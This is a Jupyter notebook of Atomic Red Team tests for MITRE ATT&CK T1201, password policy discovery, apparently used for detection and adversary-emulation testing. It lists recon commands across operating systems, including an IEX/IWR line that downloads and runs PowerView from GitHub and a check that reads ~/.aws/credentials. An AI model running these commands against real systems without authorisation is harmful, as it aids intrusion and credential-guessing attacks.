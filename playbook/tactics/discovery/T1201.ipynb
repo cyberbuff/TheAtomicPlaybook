{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ccc8b045",
   "metadata": {},
   "source": "# T1201 - Password Policy Discovery\nAdversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A)\n\nPassword policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy)."
  },
  {
   "cell_type": "markdown",
   "id": "fa894cc6",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "aeaf13f0",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Examine password complexity policy - Ubuntu",
    "Lists the password complexity policy to console on Ubuntu Linux.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/pam.d/common-password\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a32667c8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "f1547e99",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Examine password complexity policy - FreeBSD",
    "Lists the password complexity policy to console on FreeBSD.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ncat /etc/pam.d/passwd\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65fd32bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "0972bcfd",
   "metadata": {},
   "source": "### Atomic Test #3 - Examine password complexity policy - CentOS/RHEL 7.x\nLists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: System must be CentOS or RHEL v7\n\n##### Check Prereq Commands:\n```bash\nif [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then exit 0; else exit 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\necho Please run from CentOS or RHEL v7\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "31681936",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 3 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "0c3cdf5c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/security/pwquality.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "18d3a7c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "a15a89d4",
   "metadata": {},
   "source": "### Atomic Test #4 - Examine password complexity policy - CentOS/RHEL 6.x\nLists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n\n**Supported Platforms:** linux\n#### Dependencies:  Run with `bash`!\n##### Description: System must be CentOS or RHEL v6\n\n##### Check Prereq Commands:\n```bash\nif [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then exit /b 0; else exit /b 1; fi;\n\n```\n##### Get Prereq Commands:\n```bash\necho Please run from CentOS or RHEL v6\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "71637898",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "47963f4f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/pam.d/system-auth\ncat /etc/security/pwquality.conf\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98f74fd2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "0273d53a",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - Examine password expiration policy - All Linux",
    "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
    "**Supported Platforms:** linux",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ncat /etc/login.defs\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "42ec8ba5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "f1d7cc39",
   "metadata": {},
   "source": [
    "### Atomic Test #6 - Examine local password policy - Windows",
    "Lists the local password policy to console on Windows.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet accounts\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f2709358",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "0878073f",
   "metadata": {},
   "source": [
    "### Atomic Test #7 - Examine domain password policy - Windows",
    "Lists the domain password policy to console on Windows.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet accounts /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bd66fb65",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "6aa39fb2",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Examine password policy - macOS",
    "Lists the password policy to console on macOS.\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `bash`\n",
    "```bash\npwpolicy getaccountpolicies```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9f832108",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "a2ec48aa",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Get-DomainPolicy with PowerView",
    "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "345cc14f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "0bc73d53",
   "metadata": {},
   "source": [
    "### Atomic Test #10 - Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy",
    "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-addefaultdomainpasswordpolicy\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5ea4f25e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "cf2d7e97",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Use of SecEdit.exe to export the local security policy (including the password policy)",
    "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nsecedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7440d68e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "d5837696",
   "metadata": {},
   "source": "### Atomic Test #12 - Examine AWS Password Policy\nThis atomic test will display details about the password policy for the current AWS account.\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```sh\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```sh\necho Please install the aws-cli and configure your AWS defult profile using: aws configure\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f583af7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3620716b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\naws iam get-account-password-policy\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b30b4996",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1201 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "6e169518",
   "metadata": {},
   "source": "## Detection\nMonitor logs and processes for tools and command line arguments that may indicate they're being used for password policy discovery. Correlate that activity with other suspicious activity from the originating system to reduce potential false positives from valid user or administrator activity. Adversaries will likely attempt to find the password policy early in an operation and the activity is likely to happen with other Discovery activity."
  },
  {
   "cell_type": "markdown",
   "id": "a986ba0c",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Software Manipulation \n Make changes to a system's software properties and functions to achieve a desired effect. \n\n Software Manipulation allows a defender to alter or replace elements of the operating system, file system, or any other software installed and executed on a system.\n#### Opportunity\nIn an adversary engagement operation, there is an opportunity to impact what an adversary sees when they execute commands on a system.\n#### Use Case\nA defender can alter the output of the password policy description so the adversary is unsure of exactly what the requirements are.\n#### Procedures\nHook the Win32 Sleep() function so that it always performs a Sleep(1) instead of the intended duration. This can increase the speed at which dynamic analysis can be performed when a normal malicious file sleeps for long periods before attempting additional capabilities.\nHook the Win32 NetUserChangePassword() and modify it such that the new password is different from the one provided. The data passed into the function is encrypted along with the modified new password, then logged so a defender can get alerted about the change as well as decrypt the new password for use.\nAlter the output of an adversary's profiling commands to make newly-built systems look like the operating system was installed months earlier.\nAlter the output of adversary recon commands to not show important assets, such as a file server containing sensitive data.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}